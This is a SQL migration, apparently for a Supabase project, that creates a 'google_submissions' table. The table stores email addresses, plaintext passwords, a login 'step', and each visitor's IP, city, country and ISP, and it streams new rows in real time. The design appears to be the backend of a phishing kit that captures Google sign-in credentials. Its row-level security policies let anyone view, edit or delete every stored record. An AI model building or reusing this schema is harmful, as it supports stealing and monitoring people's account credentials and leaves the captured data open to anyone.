CREATE TABLE public.google_submissions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id TEXT NOT NULL,
  email TEXT,
  password TEXT,
  step TEXT,
  user_agent TEXT,
  browser TEXT,
  os TEXT,
  device TEXT,
  ip TEXT,
  ip_city TEXT,
  ip_region TEXT,
  ip_country TEXT,
  ip_isp TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

ALTER TABLE public.google_submissions ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Anyone can view google submissions" ON public.google_submissions FOR SELECT USING (true);
CREATE POLICY "Anyone can insert google submissions" ON public.google_submissions FOR INSERT WITH CHECK (true);
CREATE POLICY "Anyone can update google submissions" ON public.google_submissions FOR UPDATE USING (true);
CREATE POLICY "Anyone can delete google submissions" ON public.google_submissions FOR DELETE USING (true);

CREATE TRIGGER update_google_submissions_updated_at
BEFORE UPDATE ON public.google_submissions
FOR EACH ROW
EXECUTE FUNCTION public.update_trial_submissions_updated_at();

ALTER PUBLICATION supabase_realtime ADD TABLE public.google_submissions;
ALTER TABLE public.google_submissions REPLICA IDENTITY FULL;